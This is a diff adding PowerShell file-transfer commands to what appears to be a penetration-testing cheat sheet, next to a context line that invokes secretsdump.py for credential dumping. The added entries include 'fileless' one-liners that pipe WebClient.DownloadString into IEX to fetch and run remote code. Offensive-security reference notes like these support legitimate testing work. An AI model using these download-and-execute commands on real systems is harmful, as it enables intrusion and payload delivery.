@@ -366,6 +366,28 @@ secretsdump.py <domain>/<user>:<password>@<IP>
 ## File Transfers
 ### Windows File Transfers
 #### Powershell
+  * Powershell File Download with DownloadFile
+  ```Powershell
+  (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+  ```
+  * Powershell File Download with DownloadFileAsync
+  ```Powershell
+  (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
+  ```
+  * Powershell download with Invoke-WebRequest
+  ```Powershell
+  Invoke-WebRequest <Target File URL> -OutFile <Output File Name>
+  ```
+  ```Powershell
+  iwr <Target File URL> -OutFile <Output File Name>
+  ```
+  * Powershell Fileless Method
+  ```Powershell
+  IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
+  ```
+  ```Powershell
+  (New-Object Net.WebClient).DownloadString('<Target File URL>') | IEX
+  ```
   
 #### LOLBAS
   
